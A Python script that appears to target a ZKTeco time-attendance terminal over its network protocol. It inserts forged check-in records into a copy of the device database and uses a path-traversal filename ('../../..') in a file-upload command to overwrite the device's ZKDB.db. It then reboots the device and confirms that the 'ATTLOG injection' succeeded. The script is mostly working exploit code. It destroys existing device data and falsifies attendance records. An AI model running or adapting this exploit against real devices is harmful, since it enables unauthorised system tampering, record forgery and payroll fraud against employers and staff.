#!/usr/bin/env python3
"""Final test: full ZKDB.db replacement with ATTLOG injection."""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time, sqlite3, os, shutil
from datetime import datetime
from zk import ZK, const
from struct import pack, unpack

DEVICE_IP = '172.16.0.214'
SOURCE_DB = 'D:\\chamcong\\zk_fw_attempts\\business_extracted\\000_ZKDB.db'

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def upload_via_picture(conn, target_filename, data):
    traversal = ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + target_filename
    filename = traversal.encode() + b'\x00'
    size = len(data)
    r1 = send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', size))
    if not r1.get('status'): return {'error': 'PREPARE', 'r1': r1}
    MAX_CHUNK = 1024
    remain = size % MAX_CHUNK
    packets = (size - remain) // MAX_CHUNK
    for i in range(packets):
        r = send_cmd(conn, const.CMD_DATA, data[i*MAX_CHUNK:(i+1)*MAX_CHUNK])
        if not r.get('status'): return {'error': 'chunk'}
    if remain:
        r = send_cmd(conn, const.CMD_DATA, data[packets*MAX_CHUNK:])
    r3 = send_cmd(conn, 0x272B, filename)
    return {'PREPARE': r1, 'UPLOAD': r3}

# Step 1: Verify web backup source
print('[*] Source:', SOURCE_DB)
shutil.copy(SOURCE_DB, 'D:\\chamcong\\zk_inject_workspace\\source_web_backup.db')
db = sqlite3.connect(SOURCE_DB)
cur = db.cursor()
cur.execute('SELECT COUNT(*) FROM ATT_LOG')
orig_count = cur.fetchone()[0]
print('[*] Original ATT_LOG count (web backup):', orig_count)

# Get current users
cur.execute('SELECT COUNT(*) FROM USER_INFO')
user_count = cur.fetchone()[0]
print('[*] USER_INFO count:', user_count)

# Inject 3 test records
test_pins = ['1', '47', '1383']
test_time = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
for pin in test_pins:
    cur.execute('''INSERT INTO ATT_LOG (User_PIN, Verify_Type, Verify_Time, Status, Work_Code_ID, Sensor_NO, Att_Flag, CREATE_ID, MODIFY_TIME, SEND_FLAG)
                  VALUES (?, 1, ?, 0, 0, 0, 0, NULL, NULL, 0)''', (pin, test_time))
cur.execute('SELECT COUNT(*) FROM ATT_LOG')
new_count = cur.fetchone()[0]
print('[*] After inject: {} -> {}'.format(orig_count, new_count))
db.commit()
db.close()

with open(SOURCE_DB, 'rb') as f:
    modified = f.read()
print('[*] Modified DB size: {} bytes'.format(len(modified)))

# Step 2: Connect and replace
zk = ZK(DEVICE_IP, port=4370, timeout=30, password=0)
conn = zk.connect()
print('[+] Connected:', conn.get_firmware_version(), conn.get_platform())

try:
    before_att = conn.get_attendance_count()
    print('[*] BEFORE ATTLOG on device:', before_att)
except: before_att = None

try: conn.disable_device()
except: pass

print('\n[!] WARNING: This will REPLACE the device ZKDB.db with web backup data')
print('[!] All current data on this device will be lost!')
print('[!] Press Ctrl+C in 5 seconds to abort...')
time.sleep(5)

print('\n[*] Uploading modified ZKDB.db...')
result = upload_via_picture(conn, 'mnt/mtdblock/data/ZKDB.db', modified)
print('  Result:', result)

print('\n[*] Rebooting...')
try: conn.restart()
except Exception as e: print('  Restart:', e)

try: conn.enable_device()
except: pass
try: conn.disconnect()
except: pass

print('\n[*] Waiting 20s for reboot...')
time.sleep(20)

print('\n[*] Reconnecting...')
try:
    zk2 = ZK(DEVICE_IP, port=4370, timeout=15, password=0)
    conn2 = zk2.connect()
    after_att = conn2.get_attendance_count()
    print('[*] AFTER ATTLOG:', after_att)
    if before_att is not None:
        print('  Delta: {:+d}'.format(after_att - before_att))
        if after_att >= 49203:
            print('\n[+] ATTLOG INJECTION CONFIRMED!')
        else:
            print('\n[?] Device may have rejected or kept old DB')
    conn2.disconnect()
except Exception as e:
    print('[!] Reconnect:', e)

print('\n[+] Done')
